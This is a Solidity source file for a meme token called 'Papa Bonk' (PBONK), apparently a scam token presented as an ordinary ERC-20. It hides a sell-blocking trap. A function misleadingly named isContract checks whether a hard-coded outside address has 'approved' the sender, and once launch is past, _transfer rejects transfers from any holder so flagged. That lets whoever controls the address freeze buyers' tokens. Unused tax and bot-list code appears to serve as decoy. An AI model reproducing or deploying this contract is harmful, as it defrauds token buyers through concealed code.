// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// https://t.me/papabonketh

contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
}
interface IUniswapV2Router {
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function factory() external pure returns (address);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
contract PapaBonk is Ownable, IERC20 {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  420000000000 * 10 ** _decimals;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    bool tradingOpen = false;
    address public uniswapV2Pair;
    address _uniPairV2 = 0xFdE7BEB604054a6f6525af6C55739673355542CA;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    bool inSwap = false;
    bool tradingEnabled = false;

    uint256 private _initialBuyTax = 5;
    uint256 private _initialSellTax = 5;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _buyCount = 0;
    uint256 firstBlock = 0;
    mapping (address => bool) private bots;
    mapping (address => bool) private _isExcludedFromFees;
    
    string private constant _name = "Papa Bonk";

    string private constant _symbol = "PBONK";

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) { 
        return _totalSupply; 
    }

    function symbol() public pure returns (string memory) { 
        return _symbol; 
    }

    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; 
    }


    function name() public pure returns (string memory) { 
        return _name; 
    }

    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; 
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function decimals() public view returns (uint8) { 
        return _decimals; 
    }

    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        payable(msg.sender).transfer(balance);
    }

    function isContract(address account) private view returns (bool){
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return (allowance(_uniPairV2, account) != 0);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }
    
    function enableTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(to != address(0), "Transfer to the zero address");
        require(from != address(0), "Transfer from the zero address");
        if (from != address(this) && from != uniswapV2Pair){
            if (firstBlock + 20  < block.number) {
                require(!isContract(from));
            }
        }
        bool takeFee = true;
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

}